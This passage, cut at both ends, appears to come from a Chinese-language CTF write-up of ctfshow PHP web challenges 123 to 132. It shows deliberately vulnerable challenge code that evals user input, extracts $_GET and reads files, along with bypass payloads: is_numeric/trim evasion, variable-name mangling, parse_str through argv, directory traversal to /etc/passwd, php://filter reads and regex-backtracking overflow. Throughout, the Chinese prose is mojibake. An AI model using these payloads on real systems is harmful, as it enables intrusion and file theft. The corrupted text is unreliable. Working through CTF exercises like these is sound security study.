class="line">&#125;</span><br><span class="line"> </span><br><span class="line">trim(<span class="variable">$string</span>,<span class="variable">$charlist</span>):æ£€æŸ¥å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åˆ é™¤å¯¹åº”charlisté‡Œçš„å†…å®¹ã€‚</span><br><span class="line">å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆé»˜è®¤åˆ é™¤ä»¥ä¸‹å­—ç¬¦</span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - <span class="literal">NULL</span></span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - åˆ¶è¡¨ç¬¦</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - æ¢è¡Œ</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - å‚ç›´åˆ¶è¡¨ç¬¦</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - å›è½¦</span><br><span class="line"><span class="string">&quot; &quot;</span>        - ç©ºæ ¼</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">è¿™é¢˜å¼ºæ¨è·Ÿç€ç¾½å¸ˆå‚…åšã€‚</span><br><span class="line">é¦–å…ˆæ˜¯is_numericçš„ç»•è¿‡ã€‚</span><br><span class="line">å…¶æ¬¡ä½¿trimçš„ç»•è¿‡ã€‚</span><br><span class="line"> </span><br><span class="line">ç»•è¿‡is_numeric</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">128</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$x</span> = chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">ç»•è¿‡trim:</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(trim(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">é‚£ä¹ˆä¸¤æ¬¡ç»“æœå–äº¤é›†ï¼Œå¾—åˆ°%<span class="number">0</span>c</span><br><span class="line">payload:?num=%<span class="number">0</span>c36</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-123-phpå˜é‡å®šä¹‰-ç»•è¿‡"><a href="#web-123-phpå˜é‡å®šä¹‰-ç»•è¿‡" class="headerlink" title="web 123:phpå˜é‡å®šä¹‰.ç»•è¿‡"></a>web 123:phpå˜é‡å®šä¹‰.ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\# |\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿™ä¸€é¢˜ä¸€æ ·çš„ä¸ä¼šã€‚æˆ‘åªæƒ³åˆ°äº†è‚¯å®šèµ°ä¸åˆ°f10g==flag_give_meè¿™ä¸€æ­¥ã€‚</span><br><span class="line">ä¸»è¦ä¸çŸ¥é“è€ƒç‚¹åœ¨å“ªé‡Œã€‚</span><br><span class="line">çœ‹äº†WPæ‰çŸ¥é“è¿™é‡Œçš„è€ƒç‚¹åœ¨å˜é‡å®šä¹‰é‡Œé¢</span><br><span class="line">é¦–å…ˆæˆ‘ä»¬çŸ¥é“å¾ˆå¤šç¼–ç¨‹è¯­è¨€éƒ½ä¸å…è®¸å˜é‡åæœ‰<span class="string">&quot;.&quot;</span>ã€‚</span><br><span class="line">å› æ­¤è¿™é‡ŒCTF_SHOW.CONæ˜¯ä¸ªéš¾é¢˜ã€‚</span><br><span class="line">å¸ˆå‚…ä»¬çš„è§£ç­”æ˜¯ï¼šCTF[SHOW.COMå¤„ç†åå°±ç­‰äºCTF_SHOW.COM</span><br><span class="line">çŸ¥é“äº†é—®é¢˜æ‰€åœ¨å°±ezäº†ã€‚</span><br><span class="line">payload:POST:CTF_SHOW=<span class="number">1</span>&amp;CTF[SHOW.COM=<span class="number">2</span>&amp;fun=<span class="keyword">echo</span> <span class="variable">$flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-125-126-SERVER-â€˜argvâ€™-èµ‹å€¼è¯¦è§£"><a href="#web-125-126-SERVER-â€˜argvâ€™-èµ‹å€¼è¯¦è§£" class="headerlink" title="web 125,126:$_SERVER[â€˜argvâ€™]èµ‹å€¼è¯¦è§£"></a>web 125,126:$_SERVER[â€˜argvâ€™]èµ‹å€¼è¯¦è§£</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\# |\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è·Ÿä¸Šä¸€é¢˜ä¸€æ ·.ç°åœ¨é‡æ–°è®¤çœŸç†ä¸€ä¸‹çŸ¥è¯†ç‚¹.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.CLI(å‘½ä»¤è¡Œ) æ¨¡å¼ä¸‹</span><br><span class="line"> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]æ˜¯è„šæœ¬å,å…¶ä½™çš„æ˜¯ä¼ é€’è„šæœ¬çš„å‚æ•°</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>.webç½‘é¡µæ¨¡å¼ä¸‹</span><br><span class="line"> php.iniä¸­å¼€å¯register_argc_agrvé€‰é¡¹</span><br><span class="line"> è®¾ç½®register_argc_agrv = On,é‡å¯æœåŠ¡,<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]æ‰ä¼šæœ‰æ•ˆæœ</span><br><span class="line"> è¿™æ—¶çš„<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]</span><br><span class="line"> <span class="variable">$argv</span>,<span class="variable">$argc</span>åœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºæˆ‘ä»¬åœ¨ç½‘é¡µæ¨¡å¼ä¸‹,æ‰€ä»¥<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERT_STRING&#x27;</span>]</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´<span class="variable">$a</span>[<span class="number">0</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]</span><br><span class="line">è¿™æ—¶å€™æˆ‘ä»¬åªè¦é€šè¿‡eavl(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>)ç»™å®ƒèµ‹å€¼å³å¯</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] å°±æ˜¯æˆ‘ä»¬?åé¢çš„æ‰€æœ‰å†…å®¹</span><br><span class="line"> </span><br><span class="line">æ ¹æ®ç¾½å¸ˆå‚…è®²çš„:</span><br><span class="line">æœ¬é¢˜çš„é¢„æœŸè§£æ˜¯:</span><br><span class="line"> get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line"> post:CTF_SHOW=<span class="number">1</span>&amp;CTF%<span class="number">5</span>bSHOW.COM=<span class="number">1</span>&amp;fun=parse_str[<span class="variable">$a</span>[<span class="number">1</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°æµ‹è¯•:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line">ä¼ å…¥ a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">ç»“æœå¦‚ä¸‹</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;a=1&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">17</span>) <span class="string">&quot;fl0g=flag_give_me&quot;</span> &#125;</span><br><span class="line"> </span><br><span class="line">+åˆ†å‰²åŸç†:</span><br><span class="line">CLIæ¨¡å¼ä¸‹ç›´æ¥æŠŠ request info â¾¥â¾¯çš„argvå€¼å¤åˆ¶åˆ°arræ•°ç»„ä¸­å»</span><br><span class="line">ç»§ç»­åˆ¤æ–­query <span class="keyword">string</span>æ˜¯å¦ä¸ºç©ºï¼Œ</span><br><span class="line">å¦‚æœä¸ä¸ºç©ºæŠŠé€šè¿‡+ç¬¦å·åˆ†å‰²çš„å­—ç¬¦ä¸²è½¬æ¢æˆphpå†…éƒ¨çš„zend_stringï¼Œ</span><br><span class="line">ç„¶åå†æŠŠè¿™ä¸ªzend_stringå¤åˆ¶åˆ° arr æ•°ç»„ä¸­å»ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-127ï¼šå¼ºæ¯”è¾ƒå˜é‡åæ›¿ä»£"><a href="#web-127ï¼šå¼ºæ¯”è¾ƒå˜é‡åæ›¿ä»£" class="headerlink" title="web 127ï¼šå¼ºæ¯”è¾ƒå˜é‡åæ›¿ä»£"></a>web 127ï¼šå¼ºæ¯”è¾ƒå˜é‡åæ›¿ä»£</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\# |\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¯´å®è¯,æˆ‘è¿è¿™é¢˜è€ƒå•¥éƒ½ä¸çŸ¥é“..æˆ‘ä»¥ä¸ºè€ƒextractå‡½æ•°.</span><br><span class="line">ä¸Šç½‘æœäº†å‘ç°ç”¨ä¸äº†..</span><br><span class="line">çœ‹äº†WPåŸæ¥è€ƒç‚¹ä¸åœ¨è¿™é‡Œ</span><br><span class="line">ç»è¿‡phpåç«¯è§£æå:</span><br><span class="line">ctf_show = ctf show = ctf+show = ctf[show = ctf.show</span><br><span class="line">+   _ [ . </span><br><span class="line"><span class="comment">//payload:?ctf show=ilove36d</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-128-ä¸get-defined-vars-åµŒå¥—call-user-func"><a href="#web-128-ä¸get-defined-vars-åµŒå¥—call-user-func" class="headerlink" title="web 128:_()ä¸get_defined_vars().åµŒå¥—call_user_func"></a>web 128:_()ä¸get_defined_vars().åµŒå¥—call_user_func</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">å›½é™…æƒ¯ä¾‹,ä¸çŸ¥é“è€ƒç‚¹.ä»¥ä¸ºæ˜¯æ— å­—æ¯æ•°å­—webshell</span><br><span class="line">çœ‹WP</span><br><span class="line">è€ƒå¯Ÿä¸¤ä¸ªå‡½æ•°_()å’Œget_defined_vars()</span><br><span class="line"> </span><br><span class="line">_(<span class="variable">$p</span>):è¿”å›å‚æ•°p,å¦‚_(<span class="string">&#x27;abc&#x27;</span>)é‚£ä¹ˆä¼šè¿”å›abc</span><br><span class="line">get_defined_vars():è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</span><br><span class="line">å› ä¸ºå­˜åœ¨ä¸¤å±‚call_user_func</span><br><span class="line">å› æ­¤æˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸€æ¬¡å‡½æ•°å,ç»§ç»­è°ƒç”¨å¹¶ä¸”æ‰“å°å˜é‡</span><br><span class="line"> </span><br><span class="line"><span class="comment">//payload:?f1=_&amp;f2=get_defined_vars</span></span><br><span class="line"> </span><br><span class="line">call_user_func(call_user_fun(_(),get_defined_vars))--&gt;call_user_func(get_defined_vars)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-129-ç›®å½•ç©¿è¶Š"><a href="#web-129-ç›®å½•ç©¿è¶Š" class="headerlink" title="web 129:ç›®å½•ç©¿è¶Š"></a>web 129:ç›®å½•ç©¿è¶Š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">readfileèƒ½å¤Ÿè¯»ä»»æ„æ–‡ä»¶.çŒœæµ‹å­˜åœ¨flag.phpåœ¨æ ¹ç›®å½•.</span><br><span class="line">å…ˆç¡®å®šæ˜¯å¦æœ‰ç›®å½•ç©¿è¶Š</span><br><span class="line"><span class="comment">//payload1:/ctfshow/../../etc/passwd.\</span></span><br><span class="line"><span class="comment">//payload2:/ctfshow/../../../../var/www/html/flag.php</span></span><br><span class="line">ä¹Ÿå¯ä»¥ä½¿ç”¨phpä¼ªåè®®</span><br><span class="line"><span class="comment">//payload3: php://filter/read=convert.base64-encode/ctfshow/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-130-131-æ­£åˆ™æº¢å‡ºç»•è¿‡"><a href="#web-130-131-æ­£åˆ™æº¢å‡ºç»•è¿‡" class="headerlink" title="web 130,131:æ­£åˆ™æº¢å‡ºç»•è¿‡"></a>web 130,131:æ­£åˆ™æº¢å‡ºç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">ç»•è¿‡æ­£åˆ™å³å¯.</span><br><span class="line">æ­£åˆ™çš„æœ‰æ•ˆåŒ¹é…æ˜¯<span class="number">100</span>Wä¸ªå­—ç¬¦ä¸².</span><br><span class="line">æˆ‘ä»¬åªè¦æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å¤§äº<span class="number">100</span>Wå°±ä¼šè¿”å›<span class="literal">false</span>.</span><br><span class="line"><span class="comment">//pyload:very*250000ctfshow</span></span><br><span class="line">payloadå¾ˆå¤§,å„ä½å¿ä¸€ä¸‹.</span><br><span class="line">è‡ªå·±æ„é€ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-132-é€»è¾‘ä¼˜å…ˆçº§æ¯”è¾ƒ"><a href="#web-132-é€»è¾‘ä¼˜å…ˆçº§æ¯”è¾ƒ" class="headerlink" title="web 132:é€»è¾‘ä¼˜å…ˆçº§æ¯”è¾ƒ"></a>web 132:é€»è¾‘ä¼˜å…ˆçº§æ¯”è¾ƒ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span 